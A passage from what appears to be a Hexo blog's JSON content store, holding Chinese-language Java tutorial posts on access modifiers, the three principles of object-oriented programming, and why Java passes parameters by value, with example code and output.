1.权限\nprivate,default,protected,public<br>\nprotected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。<br>\n\n|    |    同一个类    |    同一个包  | 不同包的子类 | 不同包的非子类 |\n| :--:   |   :--:    | :--:     |   :--:     | :--:     |\n|private | √       |  |   |   |\n|default  | √  | √ |     |   |\n|protected | √  | √ |  √   |   |\n|public  | √  | √ |  √   | √  |\n\n### 2.意义\n\n设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。\n\n如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。\n\n字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。\n```\npublic class Example {\n    //public String id;  false\n    private String id;   true\n}\n```\n","source":"_posts/java/base/java访问权限.md","raw":"---\ntitle: java访问权限\ndate: 2019-06-17 11:26:34\ntags: [java]\n---\n\n### 1.权限\nprivate,default,protected,public<br>\nprotected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。<br>\n\n|    |    同一个类    |    同一个包  | 不同包的子类 | 不同包的非子类 |\n| :--:   |   :--:    | :--:     |   :--:     | :--:     |\n|private | √       |  |   |   |\n|default  | √  | √ |     |   |\n|protected | √  | √ |  √   |   |\n|public  | √  | √ |  √   | √  |\n\n### 2.意义\n\n设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。\n\n如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。\n\n字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。\n```\npublic class Example {\n    //public String id;  false\n    private String id;   true\n}\n```\n","slug":"java/base/java访问权限","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lh00436dcpba6ngmnl","content":"<h3 id=\"1-权限\"><a href=\"#1-权限\" class=\"headerlink\" title=\"1.权限\"></a>1.权限</h3><p>private,default,protected,public<br><br>protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。<br></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">同一个类</th>\n<th style=\"text-align:center\">同一个包</th>\n<th style=\"text-align:center\">不同包的子类</th>\n<th style=\"text-align:center\">不同包的非子类</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">private</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">default</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">protected</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">public</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-意义\"><a href=\"#2-意义\" class=\"headerlink\" title=\"2.意义\"></a>2.意义</h3><p>设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。</p>\n<p>如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。</p>\n<p>字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Example &#123;</span><br><span class=\"line\">    //public String id;  false</span><br><span class=\"line\">    private String id;   true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-权限\"><a href=\"#1-权限\" class=\"headerlink\" title=\"1.权限\"></a>1.权限</h3><p>private,default,protected,public<br><br>protected 用于修饰成员，表示在继承体系中成员对于子类可见，但是这个访问修饰符对于类没有意义。<br></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">同一个类</th>\n<th style=\"text-align:center\">同一个包</th>\n<th style=\"text-align:center\">不同包的子类</th>\n<th style=\"text-align:center\">不同包的非子类</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">private</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">default</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">protected</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">public</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n<td style=\"text-align:center\">√</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-意义\"><a href=\"#2-意义\" class=\"headerlink\" title=\"2.意义\"></a>2.意义</h3><p>设计良好的模块会隐藏所有的实现细节，把它的 API 与它的实现清晰地隔离开来。模块之间只通过它们的 API 进行通信，一个模块不需要知道其他模块的内部工作情况，这个概念被称为信息隐藏或封装。因此访问权限应当尽可能地使每个类或者成员不被外界访问。</p>\n<p>如果子类的方法重写了父类的方法，那么子类中该方法的访问级别不允许低于父类的访问级别。这是为了确保可以使用父类实例的地方都可以使用子类实例，也就是确保满足里氏替换原则。</p>\n<p>字段决不能是公有的，因为这么做的话就失去了对这个字段修改行为的控制，客户端可以对其随意修改。例如下面的例子中，AccessExample 拥有 id 公有字段，如果在某个时刻，我们想要使用 int 存储 id 字段，那么就需要修改所有的客户端代码。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Example &#123;</span><br><span class=\"line\">    //public String id;  false</span><br><span class=\"line\">    private String id;   true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"Java面向对象","date":"2019-08-19T18:38:34.000Z","_content":"\n## 一.三大特征\n<strong>java面向对象的三大特征：封装， 继承， 多态 <br></strong>\n### (1)封装\n合并特征和行为，进行抽象。将数据和具体细节等隐藏，提供一个统一的外部访问入口。\n### (2)继承\n在已有类的基础上，创建拥有父类属性和方法的子类。子类能进行重写和拓展。允许将对象视为自己本身或基类进行处理。\n### (3)多态\n同一个接口，使用不同的实例会进行不同的操作。<br>\n父类引用子类对象，调用方法时，会调用子类的实现，而不是父类的实现。<br>\n","source":"_posts/java/base/java面向对象.md","raw":"---\ntitle: Java面向对象\ndate: 2019-08-19 14:38:34\ntags: [java]\n---\n\n## 一.三大特征\n<strong>java面向对象的三大特征：封装， 继承， 多态 <br></strong>\n### (1)封装\n合并特征和行为，进行抽象。将数据和具体细节等隐藏，提供一个统一的外部访问入口。\n### (2)继承\n在已有类的基础上，创建拥有父类属性和方法的子类。子类能进行重写和拓展。允许将对象视为自己本身或基类进行处理。\n### (3)多态\n同一个接口，使用不同的实例会进行不同的操作。<br>\n父类引用子类对象，调用方法时，会调用子类的实现，而不是父类的实现。<br>\n","slug":"java/base/java面向对象","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lh00456dcpi79bds70","content":"<h2 id=\"一-三大特征\"><a href=\"#一-三大特征\" class=\"headerlink\" title=\"一.三大特征\"></a>一.三大特征</h2><p><strong>java面向对象的三大特征：封装， 继承， 多态 <br></strong></p>\n<h3 id=\"1-封装\"><a href=\"#1-封装\" class=\"headerlink\" title=\"(1)封装\"></a>(1)封装</h3><p>合并特征和行为，进行抽象。将数据和具体细节等隐藏，提供一个统一的外部访问入口。</p>\n<h3 id=\"2-继承\"><a href=\"#2-继承\" class=\"headerlink\" title=\"(2)继承\"></a>(2)继承</h3><p>在已有类的基础上，创建拥有父类属性和方法的子类。子类能进行重写和拓展。允许将对象视为自己本身或基类进行处理。</p>\n<h3 id=\"3-多态\"><a href=\"#3-多态\" class=\"headerlink\" title=\"(3)多态\"></a>(3)多态</h3><p>同一个接口，使用不同的实例会进行不同的操作。<br><br>父类引用子类对象，调用方法时，会调用子类的实现，而不是父类的实现。<br></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"一-三大特征\"><a href=\"#一-三大特征\" class=\"headerlink\" title=\"一.三大特征\"></a>一.三大特征</h2><p><strong>java面向对象的三大特征：封装， 继承， 多态 <br></strong></p>\n<h3 id=\"1-封装\"><a href=\"#1-封装\" class=\"headerlink\" title=\"(1)封装\"></a>(1)封装</h3><p>合并特征和行为，进行抽象。将数据和具体细节等隐藏，提供一个统一的外部访问入口。</p>\n<h3 id=\"2-继承\"><a href=\"#2-继承\" class=\"headerlink\" title=\"(2)继承\"></a>(2)继承</h3><p>在已有类的基础上，创建拥有父类属性和方法的子类。子类能进行重写和拓展。允许将对象视为自己本身或基类进行处理。</p>\n<h3 id=\"3-多态\"><a href=\"#3-多态\" class=\"headerlink\" title=\"(3)多态\"></a>(3)多态</h3><p>同一个接口，使用不同的实例会进行不同的操作。<br><br>父类引用子类对象，调用方法时，会调用子类的实现，而不是父类的实现。<br></p>\n"},{"title":"java参数传递","date":"2019-06-17T15:26:34.000Z","_content":"\nhttps://blog.csdn.net/jiangnan2014/article/details/22944075\n\nhttps://juejin.im/post/5bce68226fb9a05ce46a0476\n\n## 1.参数传递\n\n参数传递分为引用传递和值传递.\n\n- 值传递\n\n方法接收的是调用着提供的值\n\n- 引用传递\n\n方法接收的是调用者提供的变量地址\n\n\n这里我们需要注意的是一个方法可以修改 引用传递 所对应的变量值，而不能修改 值传递 所对应的变量值，这是按值调用与引用调用的根本区别。\n\n## 2.Java中的参数传递\n\n### 1.例子:\n```\npublic class MyTest {\n\n    class User{\n        private String userName;\n        private String userId;\n\n        public void setUserName(String userName){\n            this.userName = userName;\n        }\n        public void setUserId(String userId){\n            this.userId = userId;\n        }\n        public String getUser(){\n           return \"name: \" + this.userName + \"  id: \" + this.userId;\n        }\n    }\n\n    public static void transTest(User user){\n        user.setUserName(\"传递\");\n    }\n\n    public static void transTest2(int value){\n        value = value * 2;\n    }\n\n    public static void transTest3(String value){\n        value = value  + \"-changed\";\n    }\n\n    public static void transTest4(StringBuffer value){\n        value.append(\"-changed\");\n    }\n\n    public static void transTest5(char ch){\n        ch = '2';\n    }\n\n    public static void main(String[] args){\n\n        //测试1\n        User user = new MyTest().new User();\n        user.setUserId(\"01\");\n        System.out.println(\"传递前的值: \" + user.getUser());\n        transTest(user);\n        System.out.println(\"传递后的值: \" + user.getUser());\n\n        //测试2\n        System.out.println();\n        int num = 2;\n        System.out.println(\"传递前的值: \" + num);\n        transTest2(num);\n        System.out.println(\"传递后的值: \" + num);\n\n        //测试3\n        System.out.println();\n        String s = \"123\";\n        System.out.println(\"传递前的值: \" + s);\n        transTest3(s);\n        System.out.println(\"传递后的值: \" + s);\n\n        //测试4\n        System.out.println();\n        StringBuffer sb = new StringBuffer(\"123\");\n        System.out.println(\"传递前的值: \" + sb.toString());\n        transTest4(sb);\n        System.out.println(\"传递后的值: \" + sb);\n\n        //测试5\n        System.out.println();\n        char ch = '1';\n        System.out.println(\"传递前的值: \" + ch);\n        transTest5(ch);\n        System.out.println(\"传递后的值: \" + ch);\n    }\n}\n\n```\n\n结果:\n```\n传递前的值: name: null  id: 01\n传递后的值: name: 传递  id: 01\n\n传递前的值: 2\n传递后的值: 2\n\n传递前的值: 123\n传递后的值: 123\n\n传递前的值: 123\n传递后的值: 123-changed\n\n传递前的值: 1\n传递后的值: 1\n\n```\n\n### 2.结论\n\n先来结论:<br>\n\n1.java的参数传递都是传值，没有传引用.<br>\n\n2.对引用类型的传参，传的是引用类型的值(地址的值).<br>\n\n\n### 3.分析\n\n从结果来看:<br>\n\n- 测试2和测试5\n\n参数基本类型参数，传的是实参的值的一个拷贝，所以传递过后，方法内部对拷贝的值进行操作，实参本身值不变。\n\n- 测试1和测试4\n\n参数是引用类型，传的是变量的拷贝(地址)，所以在方法内进行修改，会将对应地址的信息进行修改，在外层打印时，打印的是地址中的信息(已被修改).\n\n- 测试3\n\n参数是引用类型，但是String不可变，对String的修改会新建一个对象.\n\n\n### 4.疑惑: 传地址为什么是传值，而不是传引用？\n\nhttps://www.zhihu.com/question/31203609\n知乎高赞讲解，一看就懂。<br>\n\n#### (1)类型区别\n\n```\nint num = 10; //基本类型\nString str = \"hello\"; //引用类型\n```\n\n![transfer1](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer1.jpg)\n如图：num是基本类型，值就直接保存在变量中。而str是引用类型，变量中保存的只是实际对象的地址。一般称这种变量为\"引用\"，引用指向实际对象，实际对象中保存着内容。\n\n#### (2)= 赋值的作用\n```\nnum = 20;\nstr = \"java\";\n```\n![transfer2](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer2.jpg)\n对于基本类型 num ，赋值运算符会直接改变变量的值，原来的值被覆盖掉。\n对于引用类型 str，赋值运算符会改变引用中所保存的地址，原来的地址被覆盖掉。但是原来的对象不会被改变（重要）。\n\n#### (3).调用方法时的参数传递\n\n```\nStringBuilder sb = new StringBuilder(\"iphone\");\nvoid foo(StringBuilder builder) {\n    builder.append(\"4\");\n}\nfoo(sb); // sb 被改变了，变成了\"iphone4\"\n\n\nStringBuilder sb = new StringBuilder(\"iphone\");\nvoid foo(StringBuilder builder) {\n    builder = new StringBuilder(\"ipad\");\n}\nfoo(sb); // sb 没有被改变，还是 \"iphone\"。\n\n```\n![transfer3](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer3.jpg)\n引用类型时，传递了变量的一份拷贝，(存储着地址的值)，然后进行修改操作后，修改了地址中的信息.\n\n![transfer4](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer4.jpg)\nnew StringBuilder()时，创建了一个新的地址，原地址信息还是没有改变.\n","source":"_posts/java/base/理解java中的参数传递.md","raw":"---\ntitle: java参数传递\ndate: 2019-06-17 11:26:34\ntags:\n---\n\nhttps://blog.csdn.net/jiangnan2014/article/details/22944075\n\nhttps://juejin.im/post/5bce68226fb9a05ce46a0476\n\n## 1.参数传递\n\n参数传递分为引用传递和值传递.\n\n- 值传递\n\n方法接收的是调用着提供的值\n\n- 引用传递\n\n方法接收的是调用者提供的变量地址\n\n\n这里我们需要注意的是一个方法可以修改 引用传递 所对应的变量值，而不能修改 值传递 所对应的变量值，这是按值调用与引用调用的根本区别。\n\n## 2.Java中的参数传递\n\n### 1.例子:\n```\npublic class MyTest {\n\n    class User{\n        private String userName;\n        private String userId;\n\n        public void setUserName(String userName){\n            this.userName = userName;\n        }\n        public void setUserId(String userId){\n            this.userId = userId;\n        }\n        public String getUser(){\n           return \"name: \" + this.userName + \"  id: \" + this.userId;\n        }\n    }\n\n    public static void transTest(User user){\n        user.setUserName(\"传递\");\n    }\n\n    public static void transTest2(int value){\n        value = value * 2;\n    }\n\n    public static void transTest3(String value){\n        value = value  + \"-changed\";\n    }\n\n    public static void transTest4(StringBuffer value){\n        value.append(\"-changed\");\n    }\n\n    public static void transTest5(char ch){\n        ch = '2';\n    }\n\n    public static void main(String[] args){\n\n        //测试1\n        User user = new MyTest().new User();\n        user.setUserId(\"01\");\n        System.out.println(\"传递前的值: \" + user.getUser());\n        transTest(user);\n        System.out.println(\"传递后的值: \" + user.getUser());\n\n        //测试2\n        System.out.println();\n        int num = 2;\n        System.out.println(\"传递前的值: \" + num);\n        transTest2(num);\n        System.out.println(\"传递后的值: \" + num);\n\n        //测试3\n        System.out.println();\n        String s = \"123\";\n        System.out.println(\"传递前的值: \" + s);\n        transTest3(s);\n        System.out.println(\"传递后的值: \" + s);\n\n        //测试4\n        System.out.println();\n        StringBuffer sb = new StringBuffer(\"123\");\n        System.out.println(\"传递前的值: \" + sb.toString());\n        transTest4(sb);\n        System.out.println(\"传递后的值: \" + sb);\n\n        //测试5\n        System.out.println();\n        char ch = '1';\n        System.out.println(\"传递前的值: \" + ch);\n        transTest5(ch);\n        System.out.println(\"传递后的值: \" + ch);\n    }\n}\n\n```\n\n结果:\n```\n传递前的值: name: null  id: 01\n传递后的值: name: 传递  id: 01\n\n传递前的值: 2\n传递后的值: 2\n\n传递前的值: 123\n传递后的值: 123\n\n传递前的值: 123\n传递后的值: 123-changed\n\n传递前的值: 1\n传递后的值: 1\n\n```\n\n### 2.结论\n\n先来结论:<br>\n\n1.java的参数传递都是传值，没有传引用.<br>\n\n2.对引用类型的传参，传的是引用类型的值(地址的值).<br>\n\n\n### 3.分析\n\n从结果来看:<br>\n\n- 测试2和测试5\n\n参数基本类型参数，传的是实参的值的一个拷贝，所以传递过后，方法内部对拷贝的值进行操作，实参本身值不变。\n\n- 测试1和测试4\n\n参数是引用类型，传的是变量的拷贝(地址)，所以在方法内进行修改，会将对应地址的信息进行修改，在外层打印时，打印的是地址中的信息(已被修改).\n\n- 测试3\n\n参数是引用类型，但是String不可变，对String的修改会新建一个对象.\n\n\n### 4.疑惑: 传地址为什么是传值，而不是传引用？\n\nhttps://www.zhihu.com/question/31203609\n知乎高赞讲解，一看就懂。<br>\n\n#### (1)类型区别\n\n```\nint num = 10; //基本类型\nString str = \"hello\"; //引用类型\n```\n\n![transfer1](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer1.jpg)\n如图：num是基本类型，值就直接保存在变量中。而str是引用类型，变量中保存的只是实际对象的地址。一般称这种变量为\"引用\"，引用指向实际对象，实际对象中保存着内容。\n\n#### (2)= 赋值的作用\n```\nnum = 20;\nstr = \"java\";\n```\n![transfer2](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer2.jpg)\n对于基本类型 num ，赋值运算符会直接改变变量的值，原来的值被覆盖掉。\n对于引用类型 str，赋值运算符会改变引用中所保存的地址，原来的地址被覆盖掉。但是原来的对象不会被改变（重要）。\n\n#### (3).调用方法时的参数传递\n\n```\nStringBuilder sb = new StringBuilder(\"iphone\");\nvoid foo(StringBuilder builder) {\n    builder.append(\"4\");\n}\nfoo(sb); // sb 被改变了，变成了\"iphone4\"\n\n\nStringBuilder sb = new StringBuilder(\"iphone\");\nvoid foo(StringBuilder builder) {\n    builder = new StringBuilder(\"ipad\");\n}\nfoo(sb); // sb 没有被改变，还是 \"iphone\"。\n\n```\n![transfer3](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer3.jpg)\n引用类型时，传递了变量的一份拷贝，(存储着地址的值)，然后进行修改操作后，修改了地址中的信息.\n\n![transfer4](http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer4.jpg)\nnew StringBuilder()时，创建了一个新的地址，原地址信息还是没有改变.\n","slug":"java/base/理解java中的参数传递","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321li00486dcp4kk3z9oi","content":"<p><a href=\"https://blog.csdn.net/jiangnan2014/article/details/22944075\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/jiangnan2014/article/details/22944075</a></p>\n<p><a href=\"https://juejin.im/post/5bce68226fb9a05ce46a0476\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/5bce68226fb9a05ce46a0476</a></p>\n<h2 id=\"1-参数传递\"><a href=\"#1-参数传递\" class=\"headerlink\" title=\"1.参数传递\"></a>1.参数传递</h2><p>参数传递分为引用传递和值传递.</p>\n<ul>\n<li>值传递</li>\n</ul>\n<p>方法接收的是调用着提供的值</p>\n<ul>\n<li>引用传递</li>\n</ul>\n<p>方法接收的是调用者提供的变量地址</p>\n<p>这里我们需要注意的是一个方法可以修改 引用传递 所对应的变量值，而不能修改 值传递 所对应的变量值，这是按值调用与引用调用的根本区别。</p>\n<h2 id=\"2-Java中的参数传递\"><a href=\"#2-Java中的参数传递\" class=\"headerlink\" title=\"2.Java中的参数传递\"></a>2.Java中的参数传递</h2><h3 id=\"1-例子\"><a href=\"#1-例子\" class=\"headerlink\" title=\"1.例子:\"></a>1.例子:</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    class User&#123;</span><br><span class=\"line\">        private String userName;</span><br><span class=\"line\">        private String userId;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void setUserName(String userName)&#123;</span><br><span class=\"line\">            this.userName = userName;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public void setUserId(String userId)&#123;</span><br><span class=\"line\">            this.userId = userId;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public String getUser()&#123;</span><br><span class=\"line\">           return &quot;name: &quot; + this.userName + &quot;  id: &quot; + this.userId;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest(User user)&#123;</span><br><span class=\"line\">        user.setUserName(&quot;传递&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest2(int value)&#123;</span><br><span class=\"line\">        value = value * 2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest3(String value)&#123;</span><br><span class=\"line\">        value = value  + &quot;-changed&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest4(StringBuffer value)&#123;</span><br><span class=\"line\">        value.append(&quot;-changed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest5(char ch)&#123;</span><br><span class=\"line\">        ch = &apos;2&apos;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试1</span><br><span class=\"line\">        User user = new MyTest().new User();</span><br><span class=\"line\">        user.setUserId(&quot;01&quot;);</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + user.getUser());</span><br><span class=\"line\">        transTest(user);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + user.getUser());</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试2</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        int num = 2;</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + num);</span><br><span class=\"line\">        transTest2(num);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + num);</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试3</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        String s = &quot;123&quot;;</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + s);</span><br><span class=\"line\">        transTest3(s);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + s);</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试4</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer(&quot;123&quot;);</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + sb.toString());</span><br><span class=\"line\">        transTest4(sb);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + sb);</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试5</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        char ch = &apos;1&apos;;</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + ch);</span><br><span class=\"line\">        transTest5(ch);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + ch);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">传递前的值: name: null  id: 01</span><br><span class=\"line\">传递后的值: name: 传递  id: 01</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 2</span><br><span class=\"line\">传递后的值: 2</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 123</span><br><span class=\"line\">传递后的值: 123</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 123</span><br><span class=\"line\">传递后的值: 123-changed</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 1</span><br><span class=\"line\">传递后的值: 1</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-结论\"><a href=\"#2-结论\" class=\"headerlink\" title=\"2.结论\"></a>2.结论</h3><p>先来结论:<br></p>\n<p>1.java的参数传递都是传值，没有传引用.<br></p>\n<p>2.对引用类型的传参，传的是引用类型的值(地址的值).<br></p>\n<h3 id=\"3-分析\"><a href=\"#3-分析\" class=\"headerlink\" title=\"3.分析\"></a>3.分析</h3><p>从结果来看:<br></p>\n<ul>\n<li>测试2和测试5</li>\n</ul>\n<p>参数基本类型参数，传的是实参的值的一个拷贝，所以传递过后，方法内部对拷贝的值进行操作，实参本身值不变。</p>\n<ul>\n<li>测试1和测试4</li>\n</ul>\n<p>参数是引用类型，传的是变量的拷贝(地址)，所以在方法内进行修改，会将对应地址的信息进行修改，在外层打印时，打印的是地址中的信息(已被修改).</p>\n<ul>\n<li>测试3</li>\n</ul>\n<p>参数是引用类型，但是String不可变，对String的修改会新建一个对象.</p>\n<h3 id=\"4-疑惑-传地址为什么是传值，而不是传引用？\"><a href=\"#4-疑惑-传地址为什么是传值，而不是传引用？\" 